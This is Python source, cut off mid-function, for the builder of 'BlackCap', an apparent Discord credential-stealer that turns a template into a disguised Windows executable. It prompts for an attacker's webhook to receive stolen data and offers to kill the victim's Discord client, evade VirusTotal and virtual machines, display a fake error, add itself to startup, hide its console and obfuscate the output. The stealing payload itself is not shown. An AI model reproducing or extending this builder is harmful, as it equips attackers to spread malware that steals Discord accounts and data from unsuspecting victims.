import os
import random
import shutil
import subprocess
import sys
import time
from json import load
from urllib.request import urlopen
from zlib import compress

import requests
from alive_progress import alive_bar
from colorama import Fore, Style, init

class Builder:
    def __init__(self) -> None:
        self.loading()
        
        if not self.check():
            exit()
        self.bannergui()
        self.bannergui()
        self.webhook = input(f'{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Enter your webhook: ')
        if not self.check_webhook(self.webhook):
            print(f"{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} {Fore.RED}Invalid Webhook!{Fore.RESET}")
            str(input(f"{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Press anything to exit..."))
            sys.exit()

        self.filename = input(f'{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Enter your custom output .exe name: ')

        self.killprocess = input(f'{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Kill victim Discord Client? (yes/no): ')
        if self.killprocess.lower() == 'y' or self.killprocess.lower() == 'yes':
            self.killprocess = True
        else:
            self.killprocess = False

        self.dbugkiller = input(f'{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Enable Anti-Debug (Recommand yes, Kill Virus-Total Machines / Virtual Machines or other)? (yes/no): ')
        if self.dbugkiller.lower() == 'y' or self.dbugkiller.lower() == 'yes':
            self.dbugkiller = True
        else:
            self.dbugkiller = False


        self.ping = input(f'{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Ping on new victim? (yes/no): ')
        if self.ping.lower() == 'y':
            self.ping = "yes"
        if self.ping.lower() == 'yes':
            self.ping = "yes"
            self.pingtype = input(f'{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Ping type? (here/everyone): ').lower()
            if self.pingtype not in ["here", "everyone"]:
                # default to @here if invalid ping type.
                self.pingtype == "here"
        else:
            self.ping = "no"
            self.pingtype = "none"

        self.error = input(f'{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Add a fake error? (yes/no): ')
        if self.error.lower() == 'y' or self.error.lower() == 'yes':
            self.error = "yes"
        else:
            self.error = "no"

        self.startup = input(f'{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Add file to startup? (yes/no): ')
        if self.startup.lower() == 'y' or self.startup.lower() == 'yes':
            self.startup = "yes"
        else:
            self.startup = "no"

        
        self.hider = input(f'{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Hide BlackCap console for victim? (yes/no): ')
        if self.hider.lower() == 'yes' or self.hider.lower() == 'y':
            self.hider = "yes"
        else:
            self.hider = False

        self.obfuscation = input(f'{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Do you want to obfuscate the BlackCap (recommand yes)? (yes/no): ')

        self.compy = input(f'{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Do you want to compile the file to a .exe? (yes/no): ')

        if self.compy == 'yes':
            self.icon = input(f'{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Do you want to add an icon to the .exe (yes/no): ')
            if self.icon == 'yes':
                self.icon_exe()
            else:
                pass
        else:
            pass

        self.mk_file(self.filename, self.webhook)

        print(f'{Fore.GREEN}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.GREEN}]{Fore.RESET}{Fore.WHITE} File successfully created!{Fore.RESET}')

        self.cleanup(self.filename)
        self.renamefile(self.filename)

        run = input(
            f'{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Do you want to test the file? [yes/no]: ')
        if run.lower() == 'yes' or run.lower() == 'y':
            self.run(self.filename)

        input(f'{Fore.GREEN}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.GREEN}]{Fore.RESET}{Fore.WHITE} Press enter to exit...{Fore.RESET}')
        sys.exit()

    def bannergui(self):
        p = Fore.GREEN + Style.DIM
        img = fr"""{p}


                           ██████Γ                ██████▌
                       ╓▄▄▄██████▄▄▄╖          ▄▄▄███████▄▄▄
                       ▐████████████▌          █████████████
                       ▐████████████████   ▐████████████████
                    ▄▄▄█████████████████▄▄▄█████████████████▄▄▄
                    ▓██████████████████████████████████████████▌
                    ▓█████████████████████████████████████████████▌
                    ▓██████▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀████████████████▌
                    ▓██████░░░░░░░░░░░░░░░░░░░░░░░████████████████▌
                 ██████▌░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░█████████▌
                 ██████▌░░░▄▄▄░░░░░░░░░░░░░░░░░▄▄▄░░░░░░░██████████,,,
                 ██████▌░░░███░░░░░░░░░░░░░░░░░███░░░░░░░█████████████
                 ███░░░░░░░███░░░░░░░░░░░░░░░░░███░░░░░░░░░░██████████
          ,,,,,,▄███░░░░░░░▀▀▀░░░░▄▄▄▄▄▄▄▄▄░░░░▀▀▀░░░░░░░░░░██████████,,,
          ▓█████████░░░░░░░░░░░░░▐█████████▌░░░░░░░░░░░░░░░░█████████████▌
                 ███░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██████████
             ,,,▄███░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██████████
             ▐██████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██████████
          ███▌      ██████▌░░░░░░░░░░░░░░░░░░░░░░░░░░▐█████████▌      ███Γ
          ▀▀▀L      ▀▀▀▀▀▀▀╜╜╜░░░░░░░░░░░░░░░░░░░░░░░▓███▀▀▀▀▀▀L      ▀▀▀L
                              ▓█████████████████████████▌
                              ▓█████████████████████████████
                           ,,,██████████████████████████████,,,
                           ████████████████████████████████████▌
                           ████████████████████████████████████▌
                           ████████████████████████████████████▌,,
                           ███████████████████████████████████████▌
                           ██████▌``▐█████████████████████████████▌
                           ██████▌   █████████████████████████████▌
                              ▓██▌   █████████▌   ▓█████▌   ▓█████▌
                              ```    ```███▌```   ▓██▌```   ```▀██▌
                                        ███Γ      ███Γ         ▐██▌
        """
        img1 = fr"""{p}


                           ▄▄▄▄▄▄                 ▄▄▄▄▄▄╖
                           ██████▌                ▓█████▌
                       ▐█████████████          █████████████
                       ▐█████████████▄▄▄   ,▄▄▄█████████████
                       ▐████████████████   ▐████████████████
                    ███████████████████████████████████████████Γ
                    ▓██████████████████████████████████████████▄╓╓,
                    ▓█████████████████████████████████████████████▌
                    ▓██████░░░░░░░░░░░░░░░░░░░░░░░████████████████▌
                 ,,,████▀▀▀░░░░░░░░░░░░░░░░░░░░░░░▀▀▀▀▀▀▀█████████▌
                 ██████▌░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░█████████▌
                 ██████▌░░░███░░░░░░░░░░░░░░░░░███░░░░░░░█████████████
                 ███▀▀▀░░░░███░░░░░░░░░░░░░░░░░███░░░░░░░▀▀▀██████████
                 ███░░░░░░░███░░░░░░░░░░░░░░░░░███░░░░░░░░░░██████████
          ██████████░░░░░░░░░░░░░▐█████████▌░░░░░░░░░░░░░░░░█████████████Γ
          ▀▀▀▀▀▀▀███░░░░░░░░░░░░░▐▀▀▀▀▀▀▀▀▀░░░░░░░░░░░░░░░░░██████████▀▀▀L
                 ███░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██████████
             ▐██████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██████████
          ,,,▐▀▀▀▀▀▀░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░████▀▀▀▀▀▀,,,
          ███▌      ▓██████░░░░░░░░░░░░░░░░░░░░░░░░░░▐█████████▌      ███▌
          ```       ``````]█████████████████████████████████-``       ```
                       ,,,J█████████████████████████████████,,,
                       ▐███████████████████████████████████████▌
                       ▐████████████████████████████████████████▄▄▄
                       ▐███████████████████████████████████████████,,,
                       ▐██████   ▐████████████████████████████████████
                       ```▐███   ▐████████████████████████████████████
                           ███   ▐████████████████████████████████████
                                 ▐██████   ▐████████████████   ▐██████
                                 ```▀███   ▐██████"``▀██████   ```````
                                     ███   ▐██████   ▐██████
        """
        img2 = fr"""{p}


                              ▄▄▄▄▄▄╖                ,▄▄▄▄▄▄
                              ▓█████▌                ▐██████
                           █████████████          █████████████Γ
                           █████████████▄╓╓    ╓╓╓█████████████▌
                           ████████████████▌   ████████████████▌
                       ▐██████████████████████████████████████████▌
                       ▐███████████████████████████████████████████,,,
                       ▐██████████████████████████████████████████████
                       ▐██████░░░░░░░░░░░░░░░░░░░░░░░▓████████████████
                    ,,,▐███▀▀▀░░░░░░░░░░░░░░░░░░░░░░░▐▀▀▀▀▀▀██████████
                    ▓██████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██████████
                    ▓██████░░░███▌░░░░░░░░░░░░░░░░███▌░░░░░░█████████████Γ
             ,,,,   ▓███▀▀▀░░░███▌░░░░░░░░░░░░░░░░███▌░░░░░░▀▀▀██████████▌,,,
             ▐██▌   ▓██▌░░░░░░███▌░░░░░░░░░░░░░░░░███▌░░░░░░░░░▐████████████▌
                ]██████▌░░░░░░░░░░░░░█████████▌░░░░░░░░░░░░░░░░▐█████████▌
                 ▀▀▀███▌░░░░░░░░░░░░░█████████▀░░░░░░░░░░░░░░░░▐█████████▌
                    ▓██▌░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▐█████████▌
             $█████████▌░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▐████████████▌
             ▐█████████▌░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓████████████▀
                       ▐██████░░░░░░░░░░░░░░░░░░░░░░░░░░░█████████▌
                       ▐███████████████████████████████████████████▄▄▄
                       ▐██████████████████████████████████████████████,,,
                       ▐█████████████████████████████████████████████████▌
                       ▐█████████████████████████████████████████████████▌
                       ▐█████████████████████████████████████████████████▌
                           ████████████████████████████████████▌   ██████▌
                           ``````▀██████████████████████████"``    ``````
                                 ▐██████████████████████████
        """
        img3 = fr"""{p}


                           ██████Γ                ██████▌
                       ╓▄▄▄██████▄▄▄╖          ▄▄▄███████▄▄▄
                       ▐████████████▌          █████████████
                       ▐████████████████   ▐████████████████
                    ▄▄▄█████████████████▄▄▄█████████████████▄▄▄
                    ▓██████████████████████████████████████████▌
                    ▓█████████████████████████████████████████████▌
                    ▓██████▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀████████████████▌
                    ▓██████░░░░░░░░░░░░░░░░░░░░░░░████████████████▌
                 ██████▌░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░█████████▌
                 ██████▌░░░▄▄▄░░░░░░░░░░░░░░░░░▄▄▄░░░░░░░██████████,,,
                 ██████▌░░░███░░░░░░░░░░░░░░░░░███░░░░░░░█████████████
                 ███░░░░░░░███░░░░░░░░░░░░░░░░░███░░░░░░░░░░██████████
             ,,,▄███░░░░░░░▀▀▀░░░░▄▄▄▄▄▄▄▄▄░░░░▀▀▀░░░░░░░░░░██████████
             ▐██████░░░░░░░░░░░░░▐█████████▌░░░░░░░░░░░░░░░░██████████
          ███▌   ███░░░░░░░░░░░░░░░░░██████▌░░░░░░░░░░░░░░░░█████████████Γ
          ▀▀▀L   ███░░░░░░░░░░░░░░░░░▀▀▀▀▀▀░░░░░░░░░░░░░░░░░██████████▀▀▀L
                 ███░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██████████
             ▐██▌   ██████▌░░░░░░░░░░░░░░░░░░░░░░░░░░▐█████████▌  ]███
          ,,,▐▀▀▀   ▀▀▀▀▀▀▀╜╜╜╜╜╜╜╜╜▒░░░░░░░░░░░░░░░░▓███▀▀▀▀▀▀L   ▀▀▀,,,
          ███▌                       ███████████████████▌             ███▌
          ```                    $██████████████████████████          ```
                                 ▐██████████████████████████,,,
                                 ▐█████████████████████████████▌
                                 ▐█████████████████████████████▌
                                 ▐█████████████████████████████▌
                                     ██████████████████████████▌
                                     ███████████████████████```
                                     ███████████████████████
                                        ▓███████████████████
                                        ``````▀██████████```
                                               █████████▌
        """
        img4 = fr"""{p}


                       ╓▄▄▄▄▄▄                 ▄▄▄▄▄▄
                       ▐██████                 ██████▌
                    █████████████Γ         ▐████████████▌
                    ▓████████████▄▄▄╖   ▄▄▄█████████████▌
                    ▓███████████████▌   ▓███████████████▌
                 ███████████████████████████████████████████
                 ███████████████████████████████████████████▄▄▄
                 ██████████████████████████████████████████████▌
                 ██████▌░░░░░░░░░░░░░░░░░░░░░░░████████████████▌
             ,╓╓▄███▀▀▀░░░░░░░░░░░░░░░░░░░░░░░░▀▀▀▀▀▀██████████▌
             ▐██████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▐█████████▌
             ▐██████░░░▐███░░░░░░░░░░░░░░░░▐███░░░░░░▐████████████▌
             ▐███▀▀▀░░░▐███░░░░░░░░░░░░░░░░▐███░░░░░░╚▀▀▀█████████▌
             ▐███░░░░░░▐███░░░░░░░░░░░░░░░░▐███░░░░░░░░░░█████████▌
          ███████░░░░░░░░░░░░░██████████░░░░░░░░░░░░░░░░░█████████▌
       ,,,▀▀▀████░░░░░░░░░░░░░▀▀▀███████░░░░░░░░░░░░░░░░░██████████,,,
       ███   ▐███░░░░░░░░░░░░░░░░▐██████░░░░░░░░░░░░░░░░░█████████████
             ▐███░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██████████
          ,,,Å▀▀▀░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▄███▀▀▀███▌
          ███▌   ██████▌░░░░░░░░░░░░░░░░░░░░░░░░░░██████████   ▐██▌
       ███                       ▐████████████████                ]███
       ▀▀▀                    ,,,▐████████████████,,,              ▀▀▀
                              ▓██████████████████████▌
                              ▓█████████████████████████▌
                              ▓█████████████████████████▌
                              ▓█████████████████████████▌
                              ▓█████████████████████████▌
                              ▓█████████████████████████▌
                              ▓█████████████████████████▌
                              ```▀██████████████████████▌
                                 ▐██████████████████████▌
                                     ████████████████▌
                                     ```██████████"``
                                        ██████████
        """
        img5 = fr"""{p}


                       ╓▄▄▄▄▄▄                 ▄▄▄▄▄▄
                       ▐██████                 ██████▌
                    █████████████Γ         ▐████████████▌
                    ▓████████████▄▄▄╖   ▄▄▄█████████████▌
                    ▓███████████████▌   ▓███████████████▌
                 ███████████████████████████████████████████
                 ███████████████████████████████████████████▄▄▄
                 ██████████████████████████████████████████████▌
                 ██████▌░░░░░░░░░░░░░░░░░░░░░░░████████████████▌
             ,╓╓▄███▀▀▀░░░░░░░░░░░░░░░░░░░░░░░░▀▀▀▀▀▀██████████▌
             ▐██████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▐█████████▌
             ▐██████░░░▐███░░░░░░░░░░░░░░░░▐███░░░░░░▐████████████▌
             ▐███▀▀▀░░░▐███░░░░░░░░░░░░░░░░▐███░░░░░░╚▀▀▀█████████▌
             ▐███░░░░░░▐███░░░░░░░░░░░░░░░░▐███░░░░░░░░░░█████████▌
       ██████████░░░░░░░░░░░░░██████████░░░░░░░░░░░░░░░░░█████████████
       ▀▀▀▀▀▀████░░░░░░░░░░░░░▀▀▀███████░░░░░░░░░░░░░░░░░██████████▀▀▀
             ▐███░░░░░░░░░░░░░░░░▐██████░░░░░░░░░░░░░░░░░█████████▌
          ███████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░█████████▌
       ,,,▀▀▀▀▀▀▀░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▄███▀▀▀▀▀▀▀,,,
       ███       ██████▌░░░░░░░░░░░░░░░░░░░░░░░░░░██████████       ███
                                 ▐████████████████
                              ,,,▐████████████████,,,
                              ▓██████████████████████▌
                              ▓█████████████████████████▌
                           ,,,███████████████████████████,,,
                           █████████████████████████████████
                        ▄▄██████████████████████████████████
                       ▐████████████████████████████████████,,,
                       ▐███████████████████████████████████████▌
                       ▐██████```▀███████████████████▌``▐██████▌
                       ▐██████   ▐███████████████████▌   ██████Γ
                                 ▐██████████████████████▌
                                 ```▀██████████```██████▌
                                     █████████▌   ██████▌
        """
        img6 = fr"""{p}


                           ▄▄▄▄▄▄                 ▄▄▄▄▄▄▄
                           ██████▌                ▓█████▌
                       ▐████████████▌          █████████████
                       ▐█████████████▄▄▄   ╓▄▄▄█████████████
                       ▐████████████████   ▐████████████████
                    ███████████████████████████████████████████Γ
                    ▓██████████████████████████████████████████▄▄▄╖
                    ▓█████████████████████████████████████████████▌
                    ▓██████░░░░░░░░░░░░░░░░░░░░░░░████████████████▌
                 ╓╓╓████▀▀▀░░░░░░░░░░░░░░░░░░░░░░░▀▀▀▀▀▀▀█████████▌
                 ██████▌░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░█████████▌
                 ██████▌░░░███░░░░░░░░░░░░░░░░░███░░░░░░░█████████████
                 ███▀▀▀░░░░███░░░░░░░░░░░░░░░░░███░░░░░░░▀▀▀██████████
                 ███░░░░░░░███░░░░░░░░░░░░░░░░░███░░░░░░░░░░██████████
          ██████████░░░░░░░░░░░░░▐█████████▌░░░░░░░░░░░░░░░░█████████████Γ
          ▀▀▀▀▀▀▀███░░░░░░░░░░░░░▐▀▀▀▀▀▀▀▀▀░░░░░░░░░░░░░░░░░██████████▀▀▀
                 ███░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██████████
             ▐██████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██████████
          ,,,Å▀▀▀▀▀▀░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░████▀▀▀▀▀▀,,,
          ███▌      ▓██████░░░░░░░░░░░░░░░░░░░░░░░░░░▐█████████▌      ███▌
                                     ████████████████▌
                                 ,,,J████████████████▌,,,
                                 ▐██████████████████████▌
                              ██████████████████████████████
                           ,,,██████████████████████████████,,,
                           ████████████████████████████████████▌
                           █████████████████████████████████████▄▄▄
                           ███████████████████████████████████████▌
                           █████████████████████████████▌   ▓█████▌
                           ███```▀███████████████████████▄▄▄```▀██▌
                           ███   ▐██████████████████████████   ▐██▌
                                 ▐████████████████   ▐██████
                                 ```▀███"``▀██████   ```▀███
                                     ███   ▐██████       ███
        """
        
        os.system('mode con:cols=120 lines=45')
        print(img)
        time.sleep(0.3)
        os.system("cls")
        print(img1)
        time.sleep(0.3)
        os.system("cls")
        print(img2)
        time.sleep(0.3)
        os.system("cls")
        print(img3)
        time.sleep(0.3)
        os.system("cls")
        print(img4)
        time.sleep(0.3)
        os.system("cls")
        print(img5)
        time.sleep(0.3)
        os.system("cls")
        print(img6)

    def loading(self):
        p = Fore.GREEN + Style.DIM
        r = Fore.RED + Style.BRIGHT
        img = fr"""{p} 

                                                                          ,
                                                          ▐███████████████▓                                         j████████████████[
                                                          ▐███████████████▓                                         j████████████████L
                                                          ▐███████████████▓                                         j████████████████L
                                                  ╓▄▄▄▄▄▄▄▓████████████████▄▄▄▄▄╖▄╖                         ,▄▄▄▄▄▄▄▄████████████████▌▄╖╖╖╖╖╖╓
                                                  ▓████████████████████████████████L                        ▐████████████████████████████████▌
                                                  ▓████████████████████████████████L                        ▐████████████████████████████████▌
                                                  ▓████████████████████████████████L                        ▐████████████████████████████████▌
                                                  ▓█████████████████████████████████▄▄▄▄▄▄▄m        ▄▄▄▄▄▄▄▄█████████████████████████████████▌
                                                  ▓████████████████████████████████████████▌        █████████████████████████████████████████▌
                                                  ▓████████████████████████████████████████▌        █████████████████████████████████████████▌
                                                  ▓████████████████████████████████████████▌        ▓████████████████████████████████████████▌
                                         j███████████████████████████████████████████████████████████████████████████████████████████████████████████▓
                                         j███████████████████████████████████████████████████████████████████████████████████████████████████████████▓
                                         j███████████████████████████████████████████████████████████████████████████████████████████████████████████▓
                                         j███████████████████████████████████████████████████████████████████████████████████████████████████████████▓
                                         j████████████████████████████████████████████████████████████████████████████████████████████████████████████████████L
                                         j████████████████████████████████████████████████████████████████████████████████████████████████████████████████████L
                                         j████████████████████████████████████████████████████████████████████████████████████████████████████████████████████▌
                                         j████████████████████████████████████████████████████████████████████████████████████████████████████████████████████▌
                                         j████████████████▌░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░█████████████████████████████████████████▌
                                         j▓███████████████▌░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░█████████████████████████████████████████▌
                                         j▓███████████████▌░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░█████████████████████████████████████████▌
                                 ╓▄▄▄▄▄▄▄▄████████▀▀▀▀▀▀▀▀░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█████████████████████████▌
                                 ▐████████████████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓████████████████████████L
                                 ▐████████████████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓████████████████████████L
                                 ▐████████████████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓████████████████████████L
                                 ▐████████████████░░░░░░░░╟███████▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░╟███████▓░░░░░░░░░░░░░░░░▓█████████████████████████▄▄▄▄▄▄▄▄
                                 ▐████████████████░░░░░░░░▓████████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓████████░░░░░░░░░░░░░░░░▓████████████████████████████████▌
                                 ▐████████████████░░░░░░░░▓████████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓████████░░░░░░░░░░░░░░░░▓████████████████████████████████▌
                                 ▐████████████████░░░░░░░░▓████████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓████████░░░░░░░░░░░░░░░░▓████████████████████████████████▌
                                 ▐████████░░░░░░░░░░░░░░░░▓████████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░╠▓██████▓░░░░░░░░░░░░░░░░░░░░░░░░j████████████████████████▌
                                 ▐████████░░░░░░░░░░░░░░░░▓████████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▓▓████▓╣░░░░░░░░░░░░░░░░░░░░░░░░░████████████████████████▌
                                 ▐████████░░░░░░░░░░░░░░░░▓████████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▓▓▓▓██▓▒░░░░░░░░░░░░░░░░░░░░░░░░░████████████████████████▌
                                 ▐████████░░░░░░░░░░░░░░░░╟███████▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░╙▓▓▓▓▓╜░░░░░░░░░░░░░░░░░░░░░░░░░░████████████████████████▌
                j█████████████████████████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓███████████████████████▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░████████████████████████████████▓
                j█████████████████████████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓████████████████████████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░████████████████████████████████▓
                j▓████████████████████████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓████████████████████████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░████████████████████████████████▓
                 ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█████████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▀▀▀▀▀▀▀▀█████████████████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░█████████████████████████▀▀▀▀▀▀▀▀
                                 ▐████████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓████████████████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░████████████████████████▌
                                 ▐████████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓████████████████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░████████████████████████▌
                                 ▐████████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓████████████████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░████████████████████████▌
                         ▄▄▄▄▄▄▄▄▓████████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░╙▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░████████████████████████▌
                         ▓████████████████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░████████████████████████▌
                         ▓████████████████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░████████████████████████▌
                         ▓███████████████▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░████████████████████████▌
                j▄▓▓▓▓▄▄▓``````````````` ]▓███████████████▌░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓███████████████████████▓````````````````]▓▄▓▓▓▓▓▄
                j███████▓                j▓███████████████▌░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓███████████████████████▓                j███████▓
                j▓██████▓                j▓███████████████▌░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓███████████████████████▓                j███████▓
                j▓██████▓                j▓███████████████▌░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓███████████████████████▓                j███████▓
                                                                                   ╟████████████████████████████████████████▓
                                                                                   ▐████████████████████████████████████████▓
                                                                                   ▐████████████████████████████████████████▓
                                                                            ,,,,,,,▐████████████████████████████████████████▓,,,,,,,,
                                                                      


                      IP: {load(urlopen('https://api.myip.com/'))['ip']}
                Username: {os.getlogin()}
                 PC Name: {os.getenv('COMPUTERNAME')}
        Operating System: {os.getenv('OS')}
|"""


        

        with alive_bar(40) as bar:
            for _ in range(40):
                print(img)
                time.sleep(random.randint(1, 3) / 40)
                os.system('cls')
                bar()

            os.system('cls')

        print(Style.RESET_ALL)

    def check_webhook(self, webhook):
        try:
            with requests.get(webhook) as r:
                if r.status_code == 200:
                    return True
                else:
                    return False
        except BaseException:
            return False

    def check(self):
        required_files = {'./main.py',
                          './requirements.txt',
                          './obfuscation.py'}

        for file in required_files:
            if not os.path.isfile(file):
                print(f'{Fore.RED}[{Fore.RESET}{Fore.WHITE}!{Fore.RESET}{Fore.RED}] {file} not found!')
                return False

        try:
            print(
                subprocess.check_output(
                    "python -V",
                    stderr=subprocess.STDOUT))
            print(subprocess.check_output("pip -V", stderr=subprocess.STDOUT))

        except subprocess.CalledProcessError:
            print(f'{Fore.RED}[{Fore.RESET}{Fore.WHITE}!{Fore.RESET}{Fore.RED}] Python not found!')
            return False

        os.system('pip install --upgrade -r requirements.txt')

        os.system('cls')

        os.system('mode con:cols=150 lines=20')

        return True

    def icon_exe(self):
        self.icon_name = input(f'{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Enter the name of the icon: ')

        if os.path.isfile(f"./{self.icon_name}"):
            pass
        else:
            print(f'{Fore.RED}[{Fore.RESET}+{Fore.RED}]{Fore.RESET}Icon not found! Please check the name and make sure it\'s in the current directory.')
            input(f"{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Press anything to exit...")

        if self.icon_name.endswith('.ico'):
            pass
        else:
            print(f'{Fore.RED}[{Fore.RESET}+{Fore.RED}]{Fore.RESET}Icon must have .ico extension! Please convert it and try again.')
            input(f"{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Press anything to exit...")

    def renamefile(self, filename):
        try:
            os.rename(f"./obfuscated_compressed_{filename}.py", f"./{filename}.py")
        except Exception:
            pass
        try:
            os.rename(f"./compressed_{filename}.py", f"./{filename}.py")
        except Exception:
            pass
        try:
            os.rename(f"./compressed_{filename}.exe", f"./{filename}.exe")
        except Exception:
            pass
        try:
            os.rename(f"./obfuscated_compressed_{filename}.exe", f"./{filename}.exe")
        except Exception:
            pass

    def mk_file(self, filename, webhook):
        print(f'{Fore.GREEN}[{Fore.RESET}{Fore.WHITE}+{Fore.RESET}{Fore.GREEN}]{Fore.RESET} {Fore.WHITE}Generating source code...{Fore.RESET}')

        with open('./main.py', 'r', encoding="utf-8") as f:
            code = f.read()

